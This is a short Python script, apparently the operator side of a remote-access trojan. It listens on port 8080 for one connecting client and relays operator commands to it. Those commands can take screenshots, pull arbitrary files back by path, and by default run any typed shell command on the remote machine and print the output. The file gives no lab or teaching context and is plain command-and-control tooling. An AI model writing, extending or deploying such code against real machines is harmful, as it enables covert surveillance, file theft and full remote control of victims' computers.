import socket
import base64
import random
import datetime

server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.bind(("0.0.0.0",8080))
server_socket.listen(1)
(client_socket,client_address) = server_socket.accept()
while True:
    op = input("enter operation >> ")
    if op == "EXIT":
        client_socket.send("EXIT".encode())
        break
    elif op == "screenshot":
        client_socket.send("screenshot".encode())
    elif op == "grab":
        client_socket.send("grab".encode())
        src = input("enter file path >> ")
        client_socket.send(src.encode())

        file = open("file_1."+src.split(".")[2],"wb")
        img = client_socket.recv(4)
        while base64.b64encode(img) != base64.b64encode("done".encode()):
            file.write(img)
            img = client_socket.recv(4)

        file.close()
    elif op == "help":
        print("""
        - screenshot
        - open
        - grab
        - cmd is default
        """)
    else:
        client_socket.send(op.encode())
        data = client_socket.recv(4000)
        print(data.decode())


server_socket.close()
client_socket.close()
